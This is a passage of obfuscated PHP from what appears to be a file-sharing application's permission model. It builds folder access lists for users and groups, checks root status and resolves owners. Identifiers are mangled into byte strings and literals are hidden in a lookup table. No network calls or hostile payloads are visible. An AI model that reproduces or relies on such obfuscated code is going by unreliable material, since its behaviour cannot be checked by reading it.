array($É‡‹ô‘); foreach ($ ÷ñæÉá as $±¾àÆ²ˆ) { foreach ($Íã±Ø¿‡ as $ß’´) { $ºˆÅ¯‚û = $‘é¤»‰[50] . $ß’´ . $‘é¤»‰[50]; $°Öë÷¥â = $±¾àÆ²ˆ[$‘é¤»‰[584]] . $±¾àÆ²ˆ[$‘é¤»‰[193]] . $‘é¤»‰[50]; if (strstr($°Öë÷¥â, $ºˆÅ¯‚û)) { $±ôòËÊ÷[] = $±¾àÆ²ˆ[$‘é¤»‰[193]]; break; } } } return $this->sourceListAuth($±ôòËÊ÷); } private function sourceListAuth($µ‚‹£¯â) { $Ë¥Ù±õÊ =& $_SERVER[¦»×‡Ãã]; $¹Ø¹¸ûÔ = Model($Ë¥Ù±õÊ[1420])->sourceListInfo($µ‚‹£¯â, !0); $ò±ı¨Üš = $this->sourceAuthSelect($µ‚‹£¯â); $¢§Ö”ƒö = array(); $³‹ÎÌƒ¢ = array(); foreach ($¹Ø¹¸ûÔ as $¼À‘¡¬Ö) { unset($¼À‘¡¬Ö[$Ë¥Ù±õÊ[529]]); unset($¼À‘¡¬Ö[$Ë¥Ù±õÊ[527]]); unset($¼À‘¡¬Ö[$Ë¥Ù±õÊ[487]]); unset($¼À‘¡¬Ö[$Ë¥Ù±õÊ[90]]); $÷÷´‹ûä = $ò±ı¨Üš[$¼À‘¡¬Ö[$Ë¥Ù±õÊ[193]]]; if (!$÷÷´‹ûä) { continue; } $¼À‘¡¬Ö[$Ë¥Ù±õÊ[2159]] = $this->authTargetInfo($÷÷´‹ûä); $¼À‘¡¬Ö[$Ë¥Ù±õÊ[582]] = rtrim($¼À‘¡¬Ö[$Ë¥Ù±õÊ[588]], $Ë¥Ù±õÊ[8]) . $Ë¥Ù±õÊ[8] . ltrim($¼À‘¡¬Ö[$Ë¥Ù±õÊ[582]], $Ë¥Ù±õÊ[8]); $¢§Ö”ƒö[] = $¼À‘¡¬Ö; $ÔğÃÜÜä = count(explode($Ë¥Ù±õÊ[8], trim($¼À‘¡¬Ö[$Ë¥Ù±õÊ[582]], $Ë¥Ù±õÊ[8]))); $³‹ÎÌƒ¢[] = $ÔğÃÜÜä + ($¼À‘¡¬Ö[$Ë¥Ù±õÊ[33]] == $Ë¥Ù±õÊ[78] ? 0 : 1000); } array_multisort($³‹ÎÌƒ¢, SORT_ASC, $¢§Ö”ƒö); return $¢§Ö”ƒö; } private function groupChidldAllRootSource($İÚŒªñ) { $Õæ¶ÃÀË =& $_SERVER[¦»×‡Ãã]; $ö¨¡·¢Ü = Model($Õæ¶ÃÀË[2160])->groupChildrenAll($İÚŒªñ); $¢Ù¡šª = array($Õæ¶ÃÀË[192] => 0, $Õæ¶ÃÀË[569] => array($Õæ¶ÃÀË[7], $ö¨¡·¢Ü), $Õæ¶ÃÀË[190] => SourceModel::TYPE_GROUP); $İ‰ “ĞÑ = Model($Õæ¶ÃÀË[897])->field($Õæ¶ÃÀË[193])->where($¢Ù¡šª)->select(); $İ‰ “ĞÑ = array_to_keyvalue($İ‰ “ĞÑ, $Õæ¶ÃÀË[12], $Õæ¶ÃÀË[193]); return $İ‰ “ĞÑ; } private function authTargetInfo($ã¦òÆ¶³) { $ˆ˜€•Åó =& $_SERVER[¦»×‡Ãã]; $–£§÷ê = array(); $Ã›¡Ğ² = array(); $ø´ÛŒûÀ = 2 << 25; foreach ($ã¦òÆ¶³ as $æ„µ÷¡Ø) { $ºäœÜÖ = Model($ˆ˜€•Åó[571])->listData($æ„µ÷¡Ø[$ˆ˜€•Åó[2079]]); if (!$ºäœÜÖ) { continue; } if ($æ„µ÷¡Ø[$ˆ˜€•Åó[190]] == SourceModel::TYPE_USER) { $ïÃ˜·à— = Model($ˆ˜€•Åó[577])->getInfoSimpleOuter($æ„µ÷¡Ø[$ˆ˜€•Åó[569]]); if ($ïÃ˜·à—[$ˆ˜€•Åó[1772]] == $ˆ˜€•Åó[1273]) { continue; } if ($ïÃ˜·à—[$ˆ˜€•Åó[1772]] == $ˆ˜€•Åó[228]) { $ïÃ˜·à—[$ˆ˜€•Åó[32]] = LNG($ˆ˜€•Åó[2161]); } } else { $ïÃ˜·à— = Model($ˆ˜€•Åó[585])->getInfoSimple($æ„µ÷¡Ø[$ˆ˜€•Åó[569]]); } if (!$ïÃ˜·à—) { continue; } $ïÃ˜·à—[$ˆ˜€•Åó[540]] = $ºäœÜÖ; $–£§÷ê[] = $ïÃ˜·à—; $ìãá Æ¬ = 0; if ($æ„µ÷¡Ø[$ˆ˜€•Åó[190]] == SourceModel::TYPE_GROUP) { $ìãá Æ¬ = $ø´ÛŒûÀ * 2; } if ($æ„µ÷¡Ø[$ˆ˜€•Åó[190]] == SourceModel::TYPE_USER) { $ìãá Æ¬ = $ø´ÛŒûÀ; } if ($æ„µ÷¡Ø[$ˆ˜€•Åó[190]] == SourceModel::TYPE_USER && $æ„µ÷¡Ø[$ˆ˜€•Åó[569]] == $ˆ˜€•Åó[228]) { $ìãá Æ¬ = 0; } $Ã›¡Ğ²[] = $ºäœÜÖ[$ˆ˜€•Åó[487]] + $ìãá Æ¬; } array_multisort($Ã›¡Ğ², SORT_DESC, $–£§÷ê); return $–£§÷ê; } public function getAllChildrenByUser($×¨„üâÉ, $‰»¯Å¹) { $¤Ùì‡®¢ =& $_SERVER[¦»×‡Ãã]; $¬ÅÌÚÙ = Model($¤Ùì‡®¢[598])->getInfo($‰»¯Å¹); if (!$‰»¯Å¹ || !$×¨„üâÉ || !$¬ÅÌÚÙ) { return array(); } $³ê‘‹‚³ = Model($¤Ùì‡®¢[1420])->sourceInfo($×¨„üâÉ); $–Ì­™£ğ = array(); $¤Âæ†ñˆ = 1; if ($³ê‘‹‚³[$¤Ùì‡®¢[192]] == $¤Ùì‡®¢[228] && $³ê‘‹‚³[$¤Ùì‡®¢[569]] != $¤Âæ†ñˆ && $this->groupContainUser($³ê‘‹‚³[$¤Ùì‡®¢[569]], $‰»¯Å¹)) { foreach ($¬ÅÌÚÙ[$¤Ùì‡®¢[2162]] as $¶Ü½ùˆ) { $²—±ˆÔÌ = Model($¤Ùì‡®¢[585])->getInfo($¶Ü½ùˆ[$¤Ùì‡®¢[1971]]); $¢óçêĞ¸ = Model($¤Ùì‡®¢[598])->getInfoSimpleOuter($‰»¯Å¹); $¢óçêĞ¸[$¤Ùì‡®¢[540]] = $¶Ü½ùˆ[$¤Ùì‡®¢[487]]; if (Model($¤Ùì‡®¢[571])->authCheckAction($¶Ü½ùˆ[$¤Ùì‡®¢[487]][$¤Ùì‡®¢[487]], $¤Ùì‡®¢[1992])) { continue; } $êé­Ø±ñ = array($¤Ùì‡®¢[32] => $¤Ùì‡®¢[1293] . $²—±ˆÔÌ[$¤Ùì‡®¢[32]], $¤Ùì‡®¢[193] => $²—±ˆÔÌ[$¤Ùì‡®¢[90]][$¤Ùì‡®¢[193]], $¤Ùì‡®¢[87] => KodIO::make($²—±ˆÔÌ[$¤Ùì‡®¢[90]][$¤Ùì‡®¢[193]]), $¤Ùì‡®¢[192] => $¤Ùì‡®¢[228], $¤Ùì‡®¢[190] => $¤Ùì‡®¢[578], $¤Ùì‡®¢[33] => $¤Ùì‡®¢[616], $¤Ùì‡®¢[582] => $²—±ˆÔÌ[$¤Ùì‡®¢[589]], $¤Ùì‡®¢[1971] => $²—±ˆÔÌ[$¤Ùì‡®¢[1971]], $¤Ùì‡®¢[586] => $²—±ˆÔÌ[$¤Ùì‡®¢[192]], $¤Ùì‡®¢[2159] => array($¢óçêĞ¸)); $–Ì­™£ğ[$êé­Ø±ñ[$¤Ùì‡®¢[193]]] = $êé­Ø±ñ; } } $Áù›”Ÿ® = array(); $ù–€—å = $this->getAllChildren($×¨„üâÉ); foreach ($ù–€—å as $ÕşÈ»Ùµ) { $ñ«“ø±› = !1; foreach ($ÕşÈ»Ùµ[$¤Ùì‡®¢[2159]] as $¢œ¡òô) { if ($¢œ¡òô[$¤Ùì‡®¢[1772]]) { if ($¢œ¡òô[$¤Ùì‡®¢[1772]] == $‰»¯Å¹) { $ñ«“ø±› = !0; break; } } if ($¢œ¡òô[$¤Ùì‡®¢[1971]]) { if ($this->groupContainUser($¢œ¡òô[$¤Ùì‡®¢[1971]], $‰»¯Å¹)) { $ñ«“ø±› = !0; break; } } } if ($ñ«“ø±›) { $Áù›”Ÿ®[] = $ÕşÈ»Ùµ; } $ŒìéÏ„ = $ÕşÈ»Ùµ[$¤Ùì‡®¢[193]]; if (isset($–Ì­™£ğ[$ŒìéÏ„])) { $ÕşÈ»Ùµ[$¤Ùì‡®¢[2159]][] = $–Ì­™£ğ[$ŒìéÏ„][0]; $–Ì­™£ğ[$ŒìéÏ„] = !1; } } $–Ì­™£ğ = array_filter(array_values($–Ì­™£ğ)); $Áù›”Ÿ® = array_merge($–Ì­™£ğ, $Áù›”Ÿ®); return $Áù›”Ÿ®; } public function setAllChildrenByUser($íâÉÈí, $ğ¦íõĞ, $©£§Ñ¼±) { $¬ş®–ß =& $_SERVER[¦»×‡Ãã]; $ª…ı¡—ó = $this->getAllChildrenByUser($íâÉÈí, $ğ¦íõĞ); if (!$©£§Ñ¼± || !$ª…ı¡—ó) { return !1; } foreach ($ª…ı¡—ó as $ÁäÕ”ÂÌ) { $‡‰£…·š = array(); foreach ($ÁäÕ”ÂÌ[$¬ş®–ß[2159]] as $ÄĞáµ’À) { $ğ‹ÖÎì = $ÄĞáµ’À[$¬ş®–ß[540]]; $ºòÛ¾¾‰ = $ÄĞáµ’À[$¬ş®–ß[1772]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $®àğË¤ß = $ÄĞáµ’À[$¬ş®–ß[1772]] ? $ÄĞáµ’À[$¬ş®–ß[1772]] : $ÄĞáµ’À[$¬ş®–ß[1971]]; if ($ÄĞáµ’À[$¬ş®–ß[1772]] && $ÄĞáµ’À[$¬ş®–ß[1772]] == $ğ¦íõĞ) { continue; } $‡‰£…·š[] = array($¬ş®–ß[193] => $ÁäÕ”ÂÌ[$¬ş®–ß[193]], $¬ş®–ß[190] => $ºòÛ¾¾‰, $¬ş®–ß[569] => intval($®àğË¤ß), $¬ş®–ß[2079] => isset($ğ‹ÖÎì[$¬ş®–ß[475]]) ? intval($ğ‹ÖÎì[$¬ş®–ß[475]]) : 0, $¬ş®–ß[2139] => isset($ğ‹ÖÎì[$¬ş®–ß[2139]]) ? intval($ğ‹ÖÎì[$¬ş®–ß[2139]]) : -1); } $‡‰£…·š[] = array($¬ş®–ß[193] => $ÁäÕ”ÂÌ[$¬ş®–ß[193]], $¬ş®–ß[190] => SourceModel::TYPE_USER, $¬ş®–ß[569] => intval($ğ¦íõĞ), $¬ş®–ß[2079] => intval($©£§Ñ¼±), $¬ş®–ß[2139] => -1); $this->where(array($¬ş®–ß[491] => $ÁäÕ”ÂÌ[$¬ş®–ß[193]]))->delete(); $this->addAll($‡‰£…·š); } return !0; } public function get($±£¸Û°Ú) { $´ˆÈÌü’ = $this->getSourceList(array($±£¸Û°Ú), !0); return $´ˆÈÌü’[0]; } public function getSourceList($Ó‰÷éå¨, $ÄòãÁ½ = false, $ÁÅ“Ê = false) { $¿¤òğ¬Í =& $_SERVER[¦»×‡Ãã]; if (!$Ó‰÷éå¨) { return array(); } $Üæöã²© = Model($¿¤òğ¬Í[1420]); if (!$ÄòãÁ½ && count($Ó‰÷éå¨) == 1) { $ÄòãÁ½ = array(); $ÄòãÁ½[$Ó‰÷éå¨[0]] = $Üæöã²©->sourceInfo($Ó‰÷éå¨[0]); } if (!$ÄòãÁ½) { $³³ üµ… = array($¿¤òğ¬Í[491] => array($¿¤òğ¬Í[492], $Ó‰÷éå¨)); $ÄòãÁ½ = $Üæöã²©->field($¿¤òğ¬Í[2163])->where($³³ üµ…)->select(); $ÄòãÁ½ = array_to_keyvalue($ÄòãÁ½, $¿¤òğ¬Í[193]); } $òï´²ê = $Ó‰÷éå¨; foreach ($ÄòãÁ½ as $ÀïõÛÓú => $ÈÜ¬¡„©) { $”Î¶Æ± = $Üæöã²©->parentLevelArray($ÈÜ¬¡„©[$¿¤òğ¬Í[584]]); $òï´²ê = array_merge($òï´²ê, array($ÀïõÛÓú), array_reverse($”Î¶Æ±)); } $òï´²ê = array_values(array_unique($òï´²ê)); if (!$òï´²ê) { return array(); } $·¢å‡»õ = $this->sourceAuthSelect($òï´²ê); $º¡™È ï = array(); foreach ($òï´²ê as $•êşÁÉê) { if (isset($·¢å‡»õ[$•êşÁÉê])) { $º¡™È ï[$•êşÁÉê] = $·¢å‡»õ[$•êşÁÉê]; } } $èÆŠ Ÿ = $this->userIsRoot($ÁÅ“Ê); $ŠŠÕ§â± = AuthModel::authAll(); $´ÀØÃä§ = array($¿¤òğ¬Í[488] => $ŠŠÕ§â±, $¿¤òğ¬Í[2164] => array($¿¤òğ¬Í[493] => 0, $¿¤òğ¬Í[1977] => $ŠŠÕ§â±, $¿¤òğ¬Í[494] => LNG($¿¤òğ¬Í[2165]), $¿¤òğ¬Í[1994] => $¿¤òğ¬Í[2166])); $¢åŞ‘ğô = array(); foreach ($ÄòãÁ½ as $•êşÁÉê => $Éî¶›ìô) { if ($èÆŠ Ÿ && $GLOBALS[$¿¤òğ¬Í[6]][$¿¤òğ¬Í[1990]]) { $¢åŞ‘ğô[$•êşÁÉê] = $´ÀØÃä§; continue; } $¢åŞ‘ğô[$•êşÁÉê] = $this->makeSourceAuth($Éî¶›ìô, $º¡™È ï, $ÁÅ“Ê); } return $¢åŞ‘ğô; } public function authDeepCheck($Å±‚ãˆ, $Ÿ¦¦¼ŒÖ = false) { $ıÆË¤‡ú =& $_SERVER[¦»×‡Ãã]; $Ÿ¦¦¼ŒÖ = $Ÿ¦¦¼ŒÖ ? $Ÿ¦¦¼ŒÖ : USER_ID; $ÛÆÛ«ãó = $this->makeAuthDeep($Ÿ¦¦¼ŒÖ); if (!in_array($Å±‚ãˆ, $ÛÆÛ«ãó[$ıÆË¤‡ú[2167]])) { return !1; } $°ï§—·à = array(); foreach ($ÛÆÛ«ãó[$ıÆË¤‡ú[2168]] as $ĞŸ¥ˆÔÚ => $¼¿¯ÉŒÛ) { if (!in_array($Å±‚ãˆ, $¼¿¯ÉŒÛ)) { continue; } $°ï§—·à[] = $ĞŸ¥ˆÔÚ; } if (!$°ï§—·à) { return !1; } $ß¥ë±í¬ = $°ï§—·à ? $°ï§—·à[0] : $Å±‚ãˆ; return array($ıÆË¤‡ú[488] => -1, $ıÆË¤‡ú[540] => array($ıÆË¤‡ú[493] => $ıÆË¤‡ú[1273], $ıÆË¤‡ú[1977] => $ıÆË¤‡ú[228], $ıÆË¤‡ú[494] => LNG($ıÆË¤‡ú[2169]), $ıÆË¤‡ú[1994] => $ıÆË¤‡ú[2170]), $ıÆË¤‡ú[2171] => LNG($ıÆË¤‡ú[2172]), $ıÆË¤‡ú[2173] => $this->sourceAuthInfo($ß¥ë±í¬)); } protected function makeAuthDeep($ªİŞˆ’Ã = false) { $÷Ÿ×çƒß =& $_SERVER[¦»×‡Ãã]; static $–«¦´ÓÅ = array(); $ªİŞˆ’Ã = $ªİŞˆ’Ã ? $ªİŞˆ’Ã : USER_ID; if (isset($–«¦´ÓÅ[$ªİŞˆ’Ã])) { return $–«¦´ÓÅ[$ªİŞˆ’Ã]; } $àŞØ›œ = Model($÷Ÿ×çƒß[2174])->listData(); $ŒÌàÉ¦Û = array(); foreach ($àŞØ›œ as $¾øßÇà¨) { if ($¾øßÇà¨[$÷Ÿ×çƒß[487]] == 0 && $¾øßÇà¨[$÷Ÿ×çƒß[1993]] == $÷Ÿ×çƒß[91]) { $ŒÌàÉ¦Û[] = $¾øßÇà¨[$÷Ÿ×çƒß[475]]; } } $­€‘Óû = $this->userGroupParents($ªİŞˆ’Ã); $à±ûñ¦Ú = array($÷Ÿ×çƒß[190] => SourceModel::TYPE_USER, $÷Ÿ×çƒß[569] => $ªİŞˆ’Ã); if ($­€‘Óû) { $à±ûñ¦Ú = array(array($÷Ÿ×çƒß[190] => SourceModel::TYPE_USER, $÷Ÿ×çƒß[569] => $ªİŞˆ’Ã), array($÷Ÿ×çƒß[190] => SourceModel::TYPE_GROUP, $÷Ÿ×çƒß[569] => array($÷Ÿ×çƒß[492], $­€‘Óû)), $÷Ÿ×çƒß[1078] => $÷Ÿ×çƒß[2073]); } $é£·É“” = $this->field($÷Ÿ×çƒß[2175])->where($à±ûñ¦Ú)->select(); $í¬´¨Ûú = array(); $É³–¼ª¢ = array_to_keyvalue_group($é£·É“”, $÷Ÿ×çƒß[193]); foreach ($É³–¼ª¢ as $Û… ¾¯ => $ıëş€•›) { $ÈØ™æê = $this->authArrayCheck($ıëş€•›, $ªİŞˆ’Ã); if ($ÈØ™æê[$÷Ÿ×çƒß[488]] > 0) { $í¬´¨Ûú[] = $Û… ¾¯ . $÷Ÿ×çƒß[12]; } } if ($­€‘Óû) { $’–•Ğ§¾ = Model($÷Ÿ×çƒß[585]); foreach ($­€‘Óû as $İëíĞÀ‚) { $¶“ò—ËÓ = $’–•Ğ§¾->getInfo($İëíĞÀ‚); if (!$¶“ò—ËÓ || !is_array($¶“ò—ËÓ[$÷Ÿ×çƒß[90]])) { continue; } $í¬´¨Ûú[] = $¶“ò—ËÓ[$÷Ÿ×çƒß[90]][$÷Ÿ×çƒß[193]]; } } $Ü•¡ËØ› = array(); $‘–´›ß = $­€‘Óû; $…¼‰ã¿î = Model($÷Ÿ×çƒß[1420]); $’–•Ğ§¾ = Model($÷Ÿ×çƒß[585]); $Üµ†¸ÎÈ = array(); $”¿ÕÁ¢Ñ = array(); $“«Óâ…„ = array(); $²÷Æñ‰¶ = array(); if ($í¬´¨Ûú) { $¢³å®í = $…¼‰ã¿î->where(array($÷Ÿ×çƒß[193] => array($÷Ÿ×çƒß[492], $í¬´¨Ûú)))->select(); foreach ($¢³å®í as $ÄİÚ¥) { $ôÍôÇíÄ = $…¼‰ã¿î->parentLevelArray($ÄİÚ¥[$÷Ÿ×çƒß[584]]); $Ü•¡ËØ› = array_merge($Ü•¡ËØ›, $ôÍôÇíÄ); $‘–´›ß[] = $ÄİÚ¥[$÷Ÿ×çƒß[569]]; $Üµ†¸ÎÈ[$ÄİÚ¥[$÷Ÿ×çƒß[193]]] = $ôÍôÇíÄ; $”¿ÕÁ¢Ñ[$ÄİÚ¥[$÷Ÿ×çƒß[193]]] = $ÄİÚ¥[$÷Ÿ×çƒß[569]]; } } $‘–´›ß = array_values(array_unique($‘–´›ß)); $˜ğºÍò‰ = $‘–´›ß; foreach ($˜ğºÍò‰ as $İëíĞÀ‚) { $¶“ò—ËÓ = $’–•Ğ§¾->getInfo($İëíĞÀ‚); $ôÍôÇíÄ = $…¼‰ã¿î->parentLevelArray($¶“ò—ËÓ[$÷Ÿ×çƒß[584]]); $‘–´›ß = array_merge($‘–´›ß, $ôÍôÇíÄ); } $‘–´›ß = array_values(array_unique($‘–´›ß)); foreach ($‘–´›ß as $İëíĞÀ‚) { $¶“ò—ËÓ = $’–•Ğ§¾->getInfo($İëíĞÀ‚); $Ü•¡ËØ›[] = $¶“ò—ËÓ[$÷Ÿ×çƒß[90]][$÷Ÿ×çƒß[193]]; $“«Óâ…„[$İëíĞÀ‚] = $¶“ò—ËÓ[$÷Ÿ×çƒß[90]][$÷Ÿ×çƒß[193]]; $²÷Æñ‰¶[$İëíĞÀ‚] = $…¼‰ã¿î->parentLevelArray($¶“ò—ËÓ[$÷Ÿ×çƒß[584]]); } foreach ($Üµ†¸ÎÈ as $Í°‘•Ê => $ñã™) { $¬âØ¿Ú¯ = $”¿ÕÁ¢Ñ[$Í°‘•Ê]; if (!$¬âØ¿Ú¯ || !$“«Óâ…„[$¬âØ¿Ú¯]) { continue; } $ÖÆÚÍÁ = array(); foreach ($²÷Æñ‰¶[$¬âØ¿Ú¯] as $İëíĞÀ‚) { $ÖÆÚÍÁ[] = $“«Óâ…„[$İëíĞÀ‚]; } $Üµ†¸ÎÈ[$Í°‘•Ê] = array_merge($ÖÆÚÍÁ, $ñã™); } $Ü•¡ËØ› = array_values(array_unique($Ü•¡ËØ›)); $¿Ø²¬¡ñ = array($÷Ÿ×çƒß[2167] => $Ü•¡ËØ›, $÷Ÿ×çƒß[2168] => $Üµ†¸ÎÈ); $–«¦´ÓÅ[$ªİŞˆ’Ã] = $¿Ø²¬¡ñ; return $¿Ø²¬¡ñ; } private function makeSourceAuth($ÄÕ…âÊÏ, $Š§âÑ©ä, $¢õ¿“î = false) { $ãçµ¦Ğ’ =& $_SERVER[¦»×‡Ãã]; $„éîÜ® = $ãçµ¦Ğ’[91]; $÷¸§²äÚ = $ÄÕ…âÊÏ[$ãçµ¦Ğ’[569]]; $ÒêæË€ = $ÄÕ…âÊÏ[$ãçµ¦Ğ’[190]] == SourceModel::TYPE_GROUP; $ÊåÉÃÅÁ = $ÒêæË€ ? $this->groupRootAuth($÷¸§²äÚ, $¢õ¿“î) : !1; if ($ÊåÉÃÅÁ && Model($ãçµ¦Ğ’[571])->authCheckAction($ÊåÉÃÅÁ[$ãçµ¦Ğ’[487]], $ãçµ¦Ğ’[1992])) { return $this->groupAuthInfo($ÊåÉÃÅÁ, $÷¸§²äÚ); } $ù´Û©´ = Model($ãçµ¦Ğ’[1420])->parentLevelArray($ÄÕ…âÊÏ[$ãçµ¦Ğ’[584]]); $ù´Û©´ = array_merge(array($ÄÕ…âÊÏ[$ãçµ¦Ğ’[193]]), array_reverse($ù´Û©´)); $ó–×¦åÍ = !1; foreach ($ù´Û©´ as $€ °Ùà) { if (!isset($Š§âÑ©ä[$€ °Ùà])) { continue; } $˜€ùöğ  = $this->authMake($Š§âÑ©ä[$€ °Ùà], $¢õ¿“î); if ($˜€ùöğ [$ãçµ¦Ğ’[540]]) { $ó–×¦åÍ = $˜€ùöğ ; break; } } if (!$ÒêæË€) { return $ó–×¦åÍ; } if (!$ó–×¦åÍ && $ÊåÉÃÅÁ) { $ó–×¦åÍ = $this->groupAuthInfo($ÊåÉÃÅÁ, $÷¸§²äÚ); } if (!$ó–×¦åÍ) { $½ÈÁŸİ = Model($ãçµ¦Ğ’[585])->getInfo($÷¸§²äÚ); $á¦íµ”ş = explode($ãçµ¦Ğ’[50], trim($½ÈÁŸİ[$ãçµ¦Ğ’[584]], $ãçµ¦Ğ’[50])); $á¦íµ”ş = array_reverse($á¦íµ”ş); foreach ($á¦íµ”ş as $êéİ£¡ì) { if ($êéİ£¡ì == $ãçµ¦Ğ’[228] || $êéİ£¡ì == $„éîÜ®) { continue; } $áÙü³“õ = $this->groupRootAuth($êéİ£¡ì, $¢õ¿“î); if (!$áÙü³“õ) { continue; } $ó–×¦åÍ = $this->groupAuthInfo($áÙü³“õ, $êéİ£¡ì); break; } } if (!$ó–×¦åÍ || $ó–×¦åÍ[$ãçµ¦Ğ’[488]] <= 0) { $ÇºúæÛÕ = $this->authDeepCheck($ÄÕ…âÊÏ[$ãçµ¦Ğ’[193]], $¢õ¿“î); if ($ÇºúæÛÕ) { $ó–×¦åÍ = $ÇºúæÛÕ; } } return $ó–×¦åÍ; } private function userIsRoot($ë¿Œ›‰İ = false) { $‚•çŞ¹ =& $_SERVER[¦»×‡Ãã]; if (!$ë¿Œ›‰İ && KodUser::isRoot()) { return !0; } $Â„µøòİ = Model($‚•çŞ¹[598])->getInfo($ë¿Œ›‰İ); $‡öÈ¸ƒ† = Model($‚•çŞ¹[2176])->listData($Â„µøòİ[$‚•çŞ¹[2177]]); if ($‡öÈ¸ƒ† && $‡öÈ¸ƒ†[$‚•çŞ¹[575]][$‚•çŞ¹[2178]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ü·ÅòÑƒ) { $’Šë–ö =& $_SERVER[¦»×‡Ãã]; $Æ´İ‰²˜ = Model($’Šë–ö[1420]); $ˆŠç“–½ = $Æ´İ‰²˜->sourceInfo($ü·ÅòÑƒ); if (!$ˆŠç“–½) { return !1; } $Æ´İ‰²˜->groupPathDisplay($ˆŠç“–½); $ä‚“Ì„Ï = array($ˆŠç“–½); $ä‚“Ì„Ï = $Æ´İ‰²˜->_listAppendPath($ä‚“Ì„Ï); $ˆŠç“–½ = $ä‚“Ì„Ï[0]; $á„˜ôÑ² = $ˆŠç“–½[$’Šë–ö[582]]; if (isset($ˆŠç“–½[$’Šë–ö[590]])) { $Ù’·±§™ = explode($’Šë–ö[8], trim($ˆŠç“–½[$’Šë–ö[582]], $’Šë–ö[8])); array_shift($Ù’·±§™); $á„˜ôÑ² = $ˆŠç“–½[$’Šë–ö[588]] . $’Šë–ö[2179] . implode($’Šë–ö[8], $Ù’·±§™); } return array($’Šë–ö[494] => $ˆŠç“–½[$’Šë–ö[32]], $’Šë–ö[87] => KodIO::make($ˆŠç“–½[$’Šë–ö[193]]), $’Šë–ö[2180] => $á„˜ôÑ²); } private function groupAuthInfo($œáœ¤éò, $“ïË¼êò) { $Ôï©÷º¼ =& $_SERVER[¦»×‡Ãã]; $ÄÊÚÜàı = Model($Ôï©÷º¼[585])->getInfo($“ïË¼êò); return array($Ôï©÷º¼[2181] => intval($œáœ¤éò[$Ôï©÷º¼[487]]), $Ôï©÷º¼[2164] => $œáœ¤éò, $Ôï©÷º¼[2182] => LNG($Ôï©÷º¼[2183]), $Ôï©÷º¼[2173] => array($Ôï©÷º¼[494] => $ÄÊÚÜàı[$Ôï©÷º¼[32]], $Ôï©÷º¼[87] => KodIO::make($ÄÊÚÜàı[$Ôï©÷º¼[90]][$Ôï©÷º¼[193]]), $Ôï©÷º¼[2180] => $ÄÊÚÜàı[$Ôï©÷º¼[589]])); } protected function groupRootAuth($ÜÒ³ŞÇÈ, $„½À–Ÿ× = false) { $À÷‘Ê¿á =& $_SERVER[¦»×‡Ãã]; $„½À–Ÿ× = $„½À–Ÿ× ? $„½À–Ÿ× : USER_ID; $®‰ÇÒı = $„½À–Ÿ× . $À÷‘Ê¿á[2184] . $ÜÒ³ŞÇÈ; static $ğº·ä® = array(); if (isset($ğº·ä®[$®‰ÇÒı])) { return $ğº·ä®[$®‰ÇÒı]; } $‰Åå¾ç­ = Model($À÷‘Ê¿á[585])->getInfo($ÜÒ³ŞÇÈ); $ëµÔ•¾ = $this->userGroupList($„½À–Ÿ×); $ÖÔü­ÅĞ = isset($ëµÔ•¾[$ÜÒ³ŞÇÈ]) ? $ëµÔ•¾[$ÜÒ³ŞÇÈ][$À÷‘Ê¿á[487]] : !1; if ($ÖÔü­ÅĞ && Model($À÷‘Ê¿á[571])->authCheckAction($ÖÔü­ÅĞ[$À÷‘Ê¿á[487]], $À÷‘Ê¿á[1992])) { $ğº·ä®[$®‰ÇÒı] = $ÖÔü­ÅĞ; return $ÖÔü­ÅĞ; } $Œ¹şƒ„š = $this->sourceAuthSelect($‰Åå¾ç­[$À÷‘Ê¿á[90]][$À÷‘Ê¿á[193]]); $¬É£Ãúƒ = $Œ¹şƒ„š ? $this->authMake($Œ¹şƒ„š, $„½À–Ÿ×) : !1; $°·£ĞÊœ = $¬É£Ãúƒ ? $¬É£Ãúƒ[$À÷‘Ê¿á[540]] : !1; $ğº·ä®[$®‰ÇÒı] = $°·£ĞÊœ ? $°·£ĞÊœ : $ÖÔü­ÅĞ; return $ğº·ä®[$®‰ÇÒı]; } public function authOwnerApply($ĞÔû†½¸) { $ßŒ‚¥è¡ =& $_SERVER[¦»×‡Ãã]; if (empty($ĞÔû†½¸[$ßŒ‚¥è¡[487]]) || isset($ĞÔû†½¸[$ßŒ‚¥è¡[2185]]) && $ĞÔû†½¸[$ßŒ‚¥è¡[2185]]) { return $ĞÔû†½¸; } if (AuthModel::authCheckRoot($ĞÔû†½¸[$ßŒ‚¥è¡[487]][$ßŒ‚¥è¡[488]])) { return $ĞÔû†½¸; } $å¿Šûáï = Model($ßŒ‚¥è¡[1420])->parentLevelArray($ĞÔû†½¸[$ßŒ‚¥è¡[584]]); $å¿Šûáï = array_merge(array($ĞÔû†½¸[$ßŒ‚¥è¡[193]]), array_reverse($å¿Šûáï)); $™­ÚÀˆš = $this->sourceAuthSelect($å¿Šûáï); $î·êæêÆ = array(); $ĞÊˆœÚÁ = array(); foreach ($™­ÚÀˆš as $ Ä¸‰ô => $ÕÍ‘†Åß) { $£öÃ±ÍË = $this->authFolderOwnerUser($ÕÍ‘†Åß); $î·êæêÆ[$ Ä¸‰ô] = $£öÃ±ÍË; $ĞÊˆœÚÁ = array_merge($ĞÊˆœÚÁ, $£öÃ±ÍË[$ßŒ‚¥è¡[662]]); if ($£öÃ±ÍË[$ßŒ‚¥è¡[2186]]) { break; } } if (count($ĞÊˆœÚÁ) == 0) { $ĞÊˆœÚÁ = $this->authFolderOwnerGroup($ĞÔû†½¸[$ßŒ‚¥è¡[569]]); } $ĞÊˆœÚÁ = array_unique($ĞÊˆœÚÁ); if (AuthModel::authCheckRoot($ĞÔû†½¸[$ßŒ‚¥è¡[487]][$ßŒ‚¥è¡[488]])) { $ĞÊˆœÚÁ[] = USER_ID; } $ĞÔû†½¸[$ßŒ‚¥è¡[487]][$ßŒ‚¥è¡[2187]] = Model($ßŒ‚¥è¡[577])->userListInfo($ĞÊˆœÚÁ); return $ĞÔû†½¸; } private function authFolderOwnerGroup($ğŞ’îÑ) { $ÀÄ¿Œ” =& $_SERVER[¦»×‡Ãã]; $Ò¨öæË˜ = Model($ÀÄ¿Œ”[2065])->where(array($ÀÄ¿Œ”[1971] => $ğŞ’îÑ))->select(); $ñ­‡•ê¡ = array(); if (!$Ò¨öæË˜) { return $ñ­‡•ê¡; } foreach ($Ò¨öæË˜ as $ğĞ¬í’é) { $äùéÊã™ = $this->authInfo($ğĞ¬í’é); if (AuthModel::authCheckRoot($äùéÊã™[$ÀÄ¿Œ”[487]])) { $ñ­‡•ê¡[] = 